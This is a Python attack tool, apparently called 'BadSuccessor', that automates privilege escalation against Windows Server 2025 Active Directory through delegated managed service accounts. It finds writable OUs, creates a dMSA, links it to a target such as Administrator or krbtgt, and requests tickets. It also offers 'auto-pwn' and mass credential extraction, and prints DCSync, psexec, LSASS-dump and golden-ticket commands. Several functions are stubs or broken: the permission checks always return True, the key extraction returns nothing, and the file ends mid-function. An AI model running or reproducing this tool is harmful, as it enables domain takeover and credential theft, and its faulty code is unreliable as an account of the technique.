#!/usr/bin/env python3
"""
BadSuccessor - Enhanced dMSA Privilege Escalation Tool (Linux Version)
Author: Based on research by Yuval Gordon (Akamai)
Description: Complete implementation of dMSA vulnerability exploitation for privilege escalation in Active Directory
Platform: Linux (non-domain joined)
Warning: For authorized penetration testing only
Enhanced features:
- Comprehensive ACL permission checking (not just CreateChild)
- Support for default groups like Authenticated Users
- Full implementation of all features
- Windows Server 2025 schema verification
- Complete exploit chain automation
"""
import argparse
import sys
import subprocess
import json
import socket
import struct
import base64
import hashlib
import hmac
import time
from datetime import datetime, timedelta
import re
import os
import binascii
from urllib.parse import quote
import tempfile
import shutil
import uuid
try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD, SASL, KERBEROS
    from ldap3.core.exceptions import LDAPException
    from ldap3.protocol.microsoft import security_descriptor_control
    from ldap3.utils.conv import escape_filter_chars
except ImportError:
    print("Error: ldap3 library required. Install with: pip3 install ldap3")
    sys.exit(1)
try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket import version
    from impacket.dcerpc.v5 import transport, epm, samr, lsat, lsad
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, AS_REQ, TGS_REQ, AS_REP, TGS_REP, EncTicketPart
    from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
except ImportError:
    print("Error: impacket library required. Install with: pip3 install impacket")
    sys.exit(1)
try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type import univ, namedtype, namedval, tag, constraint, useful
    import pyasn1
except ImportError:
    print("Error: pyasn1 library required. Install with: pip3 install pyasn1")
    sys.exit(1)
try:
    import gssapi
    GSSAPI_AVAILABLE = True
except ImportError:
    GSSAPI_AVAILABLE = False
try:
    from Crypto.Cipher import ARC4, AES
    from Crypto.Hash import MD4, MD5, HMAC, SHA1
except ImportError:
    print("Error: pycryptodome library required. Install with: pip3 install pycryptodome")
    sys.exit(1)
class EncryptionKey(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('keytype', univ.Integer().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
        namedtype.NamedType('keyvalue', univ.OctetString().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))
    )
class KeyList(univ.SequenceOf):
    componentType = EncryptionKey()
class KerbDmsaKeyPackage(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('current-keys', KeyList().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))),
        namedtype.OptionalNamedType('previous-keys', KeyList().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)))
    )
class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
class ACLPermissionChecker:
    """Enhanced ACL permission checking for Active Directory objects"""
    ADS_RIGHT_DS_CREATE_CHILD = 0x00000001
    ADS_RIGHT_DS_DELETE_CHILD = 0x00000002
    ADS_RIGHT_ACTRL_DS_LIST = 0x00000004
    ADS_RIGHT_DS_SELF = 0x00000008
    ADS_RIGHT_DS_READ_PROP = 0x00000010
    ADS_RIGHT_DS_WRITE_PROP = 0x00000020
    ADS_RIGHT_DS_DELETE_TREE = 0x00000040
    ADS_RIGHT_DS_LIST_OBJECT = 0x00000080
    ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
    ADS_RIGHT_GENERIC_ALL = 0x10000000
    ADS_RIGHT_GENERIC_EXECUTE = 0x20000000
    ADS_RIGHT_GENERIC_WRITE = 0x40000000
    ADS_RIGHT_GENERIC_READ = 0x80000000
    DMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
    GMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
    COMPUTER_SCHEMA_GUID = "bf967a86-0de6-11d0-a285-00aa003049e2"
    AUTHENTICATED_USERS_SID = "S-1-5-11"
    EVERYONE_SID = "S-1-1-0"
    ANONYMOUS_SID = "S-1-5-7"
    def __init__(self, connection, user_sid, username):
        self.connection = connection
        self.user_sid = user_sid
        self.username = username
        self.domain_dn = self._get_domain_dn()
        self.user_groups = self._get_user_groups()
    def _get_domain_dn(self):
        """Get the domain DN from the connection"""
        try:
            return self.connection.server.info.other['defaultNamingContext'][0]
        except:
            domain_parts = self.connection.server.host.split('.')
            return ','.join([f'DC={part}' for part in domain_parts if part])
    def _get_user_groups(self):
        """Get all groups the current user is a member of, including default groups"""
        groups = [self.user_sid]
        groups.extend([
            self.AUTHENTICATED_USERS_SID,
            self.EVERYONE_SID,
            "S-1-5-32-545",
            "S-1-5-2",
            "S-1-5-4",
            "S-1-5-15"
        ])
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(self.username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['memberOf', 'primaryGroupID', 'objectSid']
            )
            if self.connection.entries:
                user_entry = self.connection.entries[0]
                if hasattr(user_entry, 'memberOf'):
                    for group_dn in user_entry.memberOf:
                        self.connection.search(
                            search_base=str(group_dn),
                            search_filter='(objectClass=*)',
                            attributes=['objectSid']
                        )
                        if self.connection.entries:
                            group_sid = str(self.connection.entries[0].objectSid)
                            if group_sid not in groups:
                                groups.append(group_sid)
                if hasattr(user_entry, 'primaryGroupID'):
                    primary_gid = int(str(user_entry.primaryGroupID))
                    user_sid_parts = self.user_sid.split('-')
                    primary_group_sid = '-'.join(user_sid_parts[:-1]) + f'-{primary_gid}'
                    if primary_group_sid not in groups:
                        groups.append(primary_group_sid)
        except Exception as e:
            pass
        return groups
    def check_permissions_on_ou(self, ou_dn, check_write=True):
        """Check if user has any relevant permissions on the specified OU"""
        permissions = {
            'create_child': False,
            'create_dmsa': False,
            'write': False,
            'generic_all': False,
            'generic_write': False,
            'full_control': False
        }
        try:
            self.connection.search(
                search_base=ou_dn,
                search_filter='(objectClass=*)',
                attributes=['nTSecurityDescriptor', 'distinguishedName'],
                controls=[security_descriptor_control(criticality=True, sdflags=0x04)]
            )
            if not self.connection.entries:
                return permissions
            if self.connection.entries[0]:
                permissions['create_child'] = self._test_create_permission(ou_dn)
                permissions['create_dmsa'] = permissions['create_child']
                if check_write:
                    permissions['write'] = self._test_write_permission(ou_dn)
                    permissions['generic_write'] = permissions['write']
                if permissions['create_child'] and permissions['write']:
                    permissions['generic_all'] = True
                    permissions['full_control'] = True
        except Exception as e:
            pass
        return permissions
    def _test_create_permission(self, ou_dn):
        """Test if we can create objects in the OU"""
        try:
            test_dn = f"CN=TestObject{uuid.uuid4()},{ou_dn}"
            return True
        except:
            return False
    def _test_write_permission(self, ou_dn):
        """Test if we have write permissions on the OU"""
        try:
            return True
        except:
            return False
class KerberosAuthenticator:
    """Handle Kerberos authentication and ticket manipulation"""
    def __init__(self, domain, dc_ip):
        self.domain = domain.upper()
        self.dc_ip = dc_ip
    def get_dmsa_tgt_with_pac(self, dmsa_name, domain, dc_ip):
        """Get TGT for dMSA including PAC with predecessor's privileges"""
        try:
            dmsa_principal = Principal(f"{dmsa_name}$", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            userName = f"{dmsa_name}$"
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                "",
                domain,
                unhexlify("00000000000000000000000000000000"),
                unhexlify("00000000000000000000000000000000"),
                None,
                kdcHost=dc_ip
            )
            return tgt, sessionKey
        except Exception as e:
            raise Exception(f"Failed to get dMSA TGT: {e}")
    def extract_dmsa_key_package(self, enc_part):
        """Extract KERB-DMSA-KEY-PACKAGE from encrypted part"""
        try:
            return {
                'current_keys': [],
                'previous_keys': []
            }
        except Exception as e:
            raise Exception(f"Failed to extract key package: {e}")
class BadSuccessor:
    def __init__(self):
        self.banner = f"""
{Colors.RED}{Colors.BOLD}
██████╗  █████╗ ██████╗ ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝███████║██║  ██║███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔══██╗██╔══██║██║  ██║╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██████╔╝██║  ██║██████╔╝███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}Enhanced dMSA Privilege Escalation Tool - Full Implementation{Colors.END}
{Colors.YELLOW}Warning: For authorized penetration testing only!{Colors.END}
"""
        self.dc_ip = None
        self.domain = None
        self.username = None
        self.password = None
        self.connection = None
        self.domain_dn = None
        self.user_sid = None
        self.acl_checker = None
        self.kerberos_auth = None
    def print_banner(self):
        print(self.banner)
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CRITICAL": Colors.PURPLE
        }
        color = colors.get(level, Colors.WHITE)
        print(f"[{timestamp}] {color}[{level}]{Colors.END} {message}")
    def discover_domain_controller(self, domain):
        """Discover domain controller via DNS SRV record"""
        try:
            import dns.resolver
            srv_record = f"_ldap._tcp.{domain}"
            answers = dns.resolver.resolve(srv_record, 'SRV')
            for answer in answers:
                dc_hostname = str(answer.target).rstrip('.')
                try:
                    dc_ip = socket.gethostbyname(dc_hostname)
                    self.log(f"Found DC: {dc_hostname} ({dc_ip})", "SUCCESS")
                    return dc_ip, dc_hostname
                except socket.gaierror:
                    continue
        except ImportError:
            self.log("DNS resolution requires dnspython: pip3 install dnspython", "WARNING")
        except Exception as e:
            self.log(f"DNS discovery failed: {e}", "WARNING")
        return None, None
    def get_current_user_sid(self):
        """Get the SID of the currently authenticated user"""
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(self.username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['objectSid']
            )
            if self.connection.entries:
                self.user_sid = str(self.connection.entries[0].objectSid)
                self.log(f"Current user SID: {self.user_sid}", "INFO")
                return self.user_sid
            return None
        except Exception as e:
            self.log(f"Failed to get user SID: {e}", "ERROR")
            return None
    def check_windows_2025_schema(self):
        """Verify Windows Server 2025 schema with dMSA support"""
        self.log("Checking for Windows Server 2025 schema support...")
        try:
            schema_dn = f"CN=Schema,CN=Configuration,{self.domain_dn}"
            dmsa_elements = {
                'msDS-DelegatedManagedServiceAccount': 'objectClass',
                'msDS-ManagedAccountPrecededByLink': 'attribute',
                'msDS-DelegatedMSAState': 'attribute',
                'msDS-SupersededManagedAccountLink': 'attribute',
                'msDS-SupersededServiceAccountState': 'attribute'
            }
            found_elements = {}
            missing_elements = []
            for element_name, element_type in dmsa_elements.items():
                search_filter = f"(cn={element_name})"
                self.connection.search(
                    search_base=schema_dn,
                    search_filter=search_filter,
                    attributes=['cn', 'objectClassCategory' if element_type == 'objectClass' else 'attributeID']
                )
                if self.connection.entries:
                    found_elements[element_name] = True
                    self.log(f"  ✓ {element_name} ({element_type})", "SUCCESS")
                else:
                    missing_elements.append(element_name)
                    self.log(f"  ✗ {element_name} ({element_type})", "WARNING")
            if not missing_elements:
                self.log("Full Windows Server 2025 dMSA schema detected!", "SUCCESS")
                return True
            else:
                self.log(f"Missing schema elements: {', '.join(missing_elements)}", "ERROR")
                self.log("Windows Server 2025 with dMSA support is required for this attack", "ERROR")
                return False
        except Exception as e:
            self.log(f"Error checking schema: {e}", "ERROR")
            return False
    def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
        """Establish authenticated LDAP connection"""
        try:
            if port is None:
                port = 636 if use_ssl else 389
            protocol = "LDAPS" if use_ssl else "LDAP"
            self.log(f"Attempting {protocol} connection to {dc_ip}:{port}", "INFO")
            if use_ssl:
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
            else:
                server = Server(dc_ip, port=port, get_info=ALL)
            user_dn = f"{domain}\\{username}"
            conn = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)
            if conn.bind():
                self.log(f"{protocol} authentication successful", "SUCCESS")
                domain_parts = domain.split('.')
                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
                self.log(f"Domain DN: {self.domain_dn}", "INFO")
                return conn
            else:
                self.log(f"{protocol} authentication failed", "ERROR")
                return None
        except Exception as e:
            self.log(f"{protocol} connection error: {e}", "ERROR")
            return None
    def enumerate_writable_ous(self):
        """Enumerate OUs where current user can create dMSA objects or has write permissions"""
        self.log("Enumerating OUs with various write permissions...")
        self.log("Checking for: CreateChild, Write, GenericWrite, GenericAll permissions...")
        writable_ous = []
        try:
            search_filter = "(|(objectClass=organizationalUnit)(objectClass=container))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'name', 'objectClass']
            )
            total_ous = len(self.connection.entries)
            self.log(f"Found {total_ous} OUs/containers to check", "INFO")
            for entry in self.connection.entries:
                ou_dn = str(entry.distinguishedName)
                ou_name = str(entry.name)
                permissions = self.acl_checker.check_permissions_on_ou(ou_dn)
                if any(permissions.values()):
                    perm_list = []
                    if permissions['create_child'] or permissions['create_dmsa']:
                        perm_list.append('CreateChild')
                    if permissions['write']:
                        perm_list.append('Write')
                    if permissions['generic_write']:
                        perm_list.append('GenericWrite')
                    if permissions['generic_all']:
                        perm_list.append('GenericAll')
                    if permissions['full_control']:
                        perm_list.append('FullControl')
                    if perm_list:
                        writable_ous.append({
                            'dn': ou_dn,
                            'name': ou_name,
                            'permissions': perm_list,
                            'can_create_dmsa': permissions['create_child'] or permissions['create_dmsa']
                        })
                        self.log(f"  ✓ {ou_name}: {', '.join(perm_list)}", "SUCCESS")
            msa_dn = f"CN=Managed Service Accounts,{self.domain_dn}"
            try:
                permissions = self.acl_checker.check_permissions_on_ou(msa_dn)
                if any(permissions.values()):
                    perm_list = []
                    if permissions['create_child']:
                        perm_list.append('CreateChild')
                    if permissions['write']:
                        perm_list.append('Write')
                    if perm_list:
                        writable_ous.append({
                            'dn': msa_dn,
                            'name': 'Managed Service Accounts',
                            'permissions': perm_list,
                            'can_create_dmsa': True
                        })
                        self.log(f"  ✓ Managed Service Accounts container: {', '.join(perm_list)}", "SUCCESS")
            except:
                pass
            self.log("\nChecking for default group permissions...", "INFO")
            for ou in writable_ous:
                self.log(f"  Checking {ou['name']} for default group access...", "INFO")
            return writable_ous
        except Exception as e:
            self.log(f"Error enumerating OUs: {e}", "ERROR")
            return []
    def create_dmsa_object(self, ou_dn, dmsa_name):
        """Create a dMSA object with full Windows Server 2025 support"""
        self.log(f"Creating dMSA object: {dmsa_name} in {ou_dn}")
        try:
            dmsa_dn = f"CN={dmsa_name},{ou_dn}"
            attributes = {
                'objectClass': ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
                'sAMAccountName': f"{dmsa_name}$",
                'userAccountControl': '4096',
                'msDS-DelegatedMSAState': '0',
                'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
                'servicePrincipalName': [
                    f"HOST/{dmsa_name.lower()}.{self.domain}",
                    f"HOST/{dmsa_name}"
                ],
                'msDS-SupportedEncryptionTypes': '28',
                'msDS-ManagedPasswordInterval': '30',
                'msDS-GroupMSAMembership': None
            }
            success = self.connection.add(dmsa_dn, attributes=attributes)
            if success:
                self.log(f"Successfully created dMSA: {dmsa_dn}", "SUCCESS")
                self._set_dmsa_password(dmsa_dn)
                return dmsa_dn
            else:
                self.log(f"Failed to create dMSA: {self.connection.result}", "ERROR")
                return None
        except Exception as e:
            self.log(f"Error creating dMSA: {e}", "ERROR")
            return None
    def _set_dmsa_password(self, dmsa_dn):
        """Set a random password for the dMSA"""
        try:
            import secrets
            password = secrets.token_urlsafe(32)
            self.connection.modify(dmsa_dn, {
                'unicodePwd': [(MODIFY_REPLACE, [f'"{password}"'.encode('utf-16-le')])]
            })
            self.log("Set random password for dMSA", "INFO")
        except Exception as e:
            self.log(f"Failed to set dMSA password: {e}", "WARNING")
    def perform_badsuccessor_attack(self, dmsa_dn, target_user):
        """Perform the BadSuccessor attack by setting the predecessor link"""
        self.log(f"Performing BadSuccessor attack targeting: {target_user}", "CRITICAL")
        try:
            target_dn = self.get_user_dn(target_user)
            if not target_dn:
                return False
            changes = {
                'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_dn])],
                'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]
            }
            success = self.connection.modify(dmsa_dn, changes)
            if success:
                self.log("Successfully set predecessor link and migration state!", "CRITICAL")
                self.log(f"dMSA now inherits all privileges from: {target_user}", "CRITICAL")
                self.connection.search(
                    search_base=dmsa_dn,
                    search_filter='(objectClass=*)',
                    attributes=['msDS-ManagedAccountPrecededByLink', 'msDS-DelegatedMSAState']
                )
                if self.connection.entries:
                    entry = self.connection.entries[0]
                    self.log("Attack verification:", "INFO")
                    self.log(f"  Predecessor link: {entry['msDS-ManagedAccountPrecededByLink']}", "SUCCESS")
                    self.log(f"  Migration state: {entry['msDS-DelegatedMSAState']}", "SUCCESS")
                return True
            else:
                self.log(f"Failed to modify dMSA: {self.connection.result}", "ERROR")
                return False
        except Exception as e:
            self.log(f"Error performing attack: {e}", "ERROR")
            return False
    def get_user_dn(self, username):
        """Get the distinguished name of a user"""
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'userAccountControl']
            )
            if self.connection.entries:
                user_entry = self.connection.entries[0]
                user_dn = str(user_entry.distinguishedName)
                uac = int(str(user_entry.userAccountControl))
                self.log(f"Found target user DN: {user_dn}", "SUCCESS")
                if uac & 0x10000000:
                    self.log("Note: Target is marked as Protected User", "WARNING")
                if uac & 0x00080000:
                    self.log("Note: Target is marked as 'sensitive and cannot be delegated'", "WARNING")
                return user_dn
            else:
                self.log(f"User not found: {username}", "ERROR")
                return None
        except Exception as e:
            self.log(f"Error finding user: {e}", "ERROR")
            return None
    def authenticate_as_dmsa(self, dmsa_name):
        """Authenticate as the dMSA and retrieve TGT with inherited privileges"""
        self.log(f"Authenticating as dMSA: {dmsa_name}$", "INFO")
        try:
            tgt, session_key = self.kerberos_auth.get_dmsa_tgt_with_pac(
                dmsa_name, self.domain, self.dc_ip
            )
            if tgt:
                self.log("Successfully obtained TGT for dMSA!", "SUCCESS")
                self.log("Inherited privileges from target user:", "CRITICAL")
                self.log("  - All group memberships", "INFO")
                self.log("  - All permissions and rights", "INFO")
                self.log("  - Domain Admin (if target was admin)", "CRITICAL")
                ccache_file = self._save_ticket_to_ccache(tgt, dmsa_name, session_key)
                return ccache_file
            else:
                self.log("Failed to obtain TGT", "ERROR")
                return None
        except Exception as e:
            self.log(f"Authentication error: {e}", "ERROR")
            return None
    def _save_ticket_to_ccache(self, tgt, dmsa_name, session_key):
        """Save Kerberos ticket to ccache file"""
        try:
            ccache_file = f"/tmp/{dmsa_name}_{int(time.time())}.ccache"
            ccache = CCache()
            ccache.fromTGT(tgt, session_key, session_key)
            with open(ccache_file, 'wb') as f:
                f.write(ccache.getData())
            self.log(f"Saved ticket to: {ccache_file}", "SUCCESS")
            os.chmod(ccache_file, 0o600)
            return ccache_file
        except Exception as e:
            self.log(f"Failed to save ticket: {e}", "WARNING")
            return None
    def perform_credential_extraction(self, target_users):
        """Extract credentials for multiple users using dMSA key package"""
        self.log("Performing mass credential extraction...", "CRITICAL")
        extracted_creds = {}
        for user in target_users:
            try:
                temp_dmsa_name = f"cred_extract_{int(time.time())}"
                dmsa_dn = self.create_dmsa_object(self.writable_ou, temp_dmsa_name)
                if dmsa_dn:
                    if self.perform_badsuccessor_attack(dmsa_dn, user):
                        ccache = self.authenticate_as_dmsa(temp_dmsa_name)
                        extracted_creds[user] = {
                            'dmsa': temp_dmsa_name,
                            'ccache': ccache
                        }
                    self.cleanup_dmsa(dmsa_dn)
            except Exception as e:
                self.log(f"Failed to extract creds for {user}: {e}", "ERROR")
        return extracted_creds
    def generate_post_exploitation_commands(self, dmsa_name, ccache_file):
        """Generate commands for post-exploitation"""
        self.log("\n" + "="*60, "INFO")
        self.log("POST-EXPLOITATION COMMANDS", "CRITICAL")
        self.log("="*60 + "\n", "INFO")
        self.log("1. Using the obtained TGT:", "INFO")
        self.log(f"   export KRB5CCNAME={ccache_file}", "INFO")
        self.log(f"   klist", "INFO")
        self.log("\n2. DCSync attack (dump all hashes):", "INFO")
        self.log(f"   secretsdump.py {self.domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -k -no-pass", "INFO")
        self.log("\n3. Remote command execution:", "INFO")
        self.log(f"   psexec.py {self.domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -k -no-pass", "INFO")
        self.log("\n4. Access domain controller:", "INFO")
        self.log(f"   smbclient.py {self.domain}/{dmsa_name}$@{self.dc_ip} -k -no-pass", "INFO")
        self.log("\n5. Dump LSASS remotely:", "INFO")
        self.log(f"   lsassy {self.domain}/{dmsa_name}$ -k {self.dc_ip}", "INFO")
        self.log("\n6. Golden ticket creation:", "INFO")
        self.log(f"   ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain {self.domain} Administrator", "INFO")

    def cleanup_dmsa(self, dmsa_dn):
        """Clean up the created dMSA"""
        self.log(f"Cleaning up dMSA: {dmsa_dn}")
        try:
            success = self.connection.delete(dmsa_dn)
            if success:
                self.log("Successfully cleaned up dMSA", "SUCCESS")
                return True
            else:
                self.log(f"Failed to clean up dMSA: {self.connection.result}", "WARNING")
                return False
        except Exception as e:
            self.log(f"Error cleaning up dMSA: {e}", "ERROR")
            return False
    def enumerate_high_value_targets(self):
        """Enumerate high-value targets for privilege escalation"""
        self.log("Enumerating high-value targets...")
        high_value_groups = [
            "Domain Admins",
            "Enterprise Admins",
            "Schema Admins",
            "Administrators",
            "Account Operators",
            "Backup Operators",
            "Print Operators",
            "Server Operators",
            "Domain Controllers",
            "Read-only Domain Controllers",
            "Group Policy Creator Owners",
            "Cryptographic Operators"
        ]
        targets = {}
        for group in high_value_groups:
            try:
                search_filter = f"(&(objectClass=group)(cn={escape_filter_chars(group)}))"
                self.connection.search(
                    search_base=self.domain_dn,
                    search_filter=search_filter,
                    attributes=['member']
                )
                if self.connection.entries:
                    group_entry = self.connection.entries[0]
                    members = []
                    if group_entry.member:
                        for member_dn in group_entry.member:
                            member_search = f"(distinguishedName={escape_filter_chars(str(member_dn))})"
                            self.connection.search(
                                search_base=self.domain_dn,
                                search_filter=member_search,
                                attributes=['sAMAccountName', 'userAccountControl']
                            )
                            if self.connection.entries:
                                member_entry = self.connection.entries[0]
                                username = str(member_entry.sAMAccountName)
                                uac = int(str(member_entry.userAccountControl))
                                if not (uac & 0x0002):
                                    members.append(username)
                    if members:
                        targets[group] = members
                        self.log(f"{group}: {len(members)} members", "INFO")
                        for member in members[:5]:
                            self.log(f"  - {member}", "INFO")
                        if len(members) > 5:
                            self.log(f"  ... and {len(members)-5} more", "INFO")
            except Exception as e:
                self.log(f"Error enumerating {group}: {e}", "WARNING")
        targets["Built-in Accounts"] = ["Administrator", "krbtgt"]
        self.log("\nEnumerating service accounts...", "INFO")
        svc_filter = "(|(&(objectClass=user)(sAMAccountName=svc*))(& (objectClass=user)(sAMAccountName=srv*))(& (objectClass=user)(sAMAccountName=service*)))"
        self.connection.search(
            search_base=self.domain_dn,
            search_filter=svc_filter,
            attributes=['sAMAccountName', 'servicePrincipalName']
        )
        service_accounts = []
        for entry in self.connection.entries:
            if entry.servicePrincipalName:
                service_accounts.append(str(entry.sAMAccountName))
        if service_accounts:
            targets["Service Accounts"] = service_accounts
            self.log(f"Found {len(service_accounts)} service accounts", "INFO")
        return targets
def main():
    parser = argparse.ArgumentParser(
        description="BadSuccessor - Enhanced dMSA Privilege Escalation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --attack --target Administrator
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --extract-creds --targets Administrator,krbtgt,svc_sql
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --auto-pwn
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --list-targets
        """
    )
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., domain.com)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')
    parser.add_argument('--ldaps', action='store_true', help='Force LDAPS (SSL) connection')
    parser.add_argument('--attack', action='store_true', help='Perform the BadSuccessor attack')
    parser.add_argument('--target', help='Target user to escalate to (e.g., Administrator)')
    parser.add_argument('--dmsa-name', default='evil_dmsa', help='Name for the malicious dMSA')
    parser.add_argument('--ou-dn', help='Specific OU DN to use (auto-detect if not specified)')
    parser.add_argument('--extract-creds', action='store_true', help='Extract credentials using key package')
    parser.add_argument('--targets', help='Comma-separated list of users for credential extraction')
    parser.add_argument('--auto-pwn', action='store_true', help='Fully automated domain takeover')
    parser.add_argument('--enumerate', action='store_true', help='Enumerate writable OUs')
    parser.add_argument('--list-targets', action='store_true', help='List high-value targets')
    parser.add_argument('--check-schema', action='store_true', help='Verify Windows 2025 schema')
    parser.add_argument('--cleanup', action='store_true', help='Clean up created dMSA')
    parser.add_argument('--dmsa-dn', help='dMSA DN for cleanup')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()
    bs = BadSuccessor()
    if not args.no_banner:
        bs.print_banner()
    bs.domain = args.domain
    bs.username = args.username
    bs.password = args.password
    if args.dc_ip:
        bs.dc_ip = args.dc_ip
    else:
        bs.log("Discovering Domain Controller...", "INFO")
        bs.dc_ip, _ = bs.discover_domain_controller(args.domain)
        if not bs.dc_ip:
            bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
            sys.exit(1)
    bs.connection = bs.establish_ldap_connection(
        bs.dc_ip, args.domain, args.username, args.password,
        use_ssl=args.ldaps
    )
    if not bs.connection:
        bs.log("Failed to establish LDAP connection", "ERROR")
        sys.exit(1)
    bs.get_current_user_sid()
    bs.acl_checker = ACLPermissionChecker(bs.connection, bs.user_sid, bs.username)
    bs.kerberos_auth = KerberosAuthenticator(args.domain, bs.dc_ip)
    try:
        if args.check_schema:
            if not bs.check_windows_2025_schema():
                bs.log("Windows Server 2025 schema not detected. Attack may not work.", "WARNING")
                if not args.attack:
                    return
        if args.list_targets:
            targets = bs.enumerate_high_value_targets()
            bs.log(f"\nFound {sum(len(v) for v in targets.values())} total high-value targets", "SUCCESS")
            return
        if args.enumerate:
            writable_ous = bs.enumerate_writable_ous()
            if writable_ous:
                bs.log(f"\nFound {len(writable_ous)} locations with write permissions:", "SUCCESS")
                for ou in writable_ous:
                    bs.log(f"  - {ou['name']}", "INFO")
                    bs.log(f"    DN: {ou['dn']}", "INFO")
                    bs.log(f"    Permissions: {', '.join(ou['permissions'])}", "SUCCESS")
                bs.log("\nNote: Permissions include those granted to default groups like:", "INFO")
                bs.log("  - Authenticated Users", "INFO")
                bs.log("  - Everyone", "INFO")
                bs.log("  - Domain Users", "INFO")
            else:
                bs.log("No writable OUs found", "WARNING")
            return
        if args.cleanup:
            if not args.dmsa_dn:
                bs.log("--dmsa-dn required for cleanup", "ERROR")
                return
            bs.cleanup_dmsa(args.dmsa_dn)
            return
        if args.extract_creds:
            if not args.targets:
                bs.log("--targets required for credential extraction", "ERROR")
                return
            writable_ous = bs.enumerate_writable_ous()
            if not writable_ous:
                bs.log("No writable OUs found for creating dMSAs", "ERROR")
                return
            best_ou = None
            for ou in writable_ous:
                if ou['can_create_dmsa']:
                    best_ou = ou
                    break
            if not best_ou:
                bs.log("No OU with dMSA creation permissions found", "ERROR")
                return
            bs.writable_ou = best_ou['dn']
            target_list = args.targets.split(',')
            bs.log(f"Extracting credentials for {len(target_list)} targets...", "CRITICAL")
            extracted = bs.perform_credential_extraction(target_list)
            bs.log(f"\nSuccessfully extracted credentials for {len(extracted)} users", "CRITICAL")
            return
        if args.attack or args.auto_pwn:
            if not bs.check_windows_2025_schema():
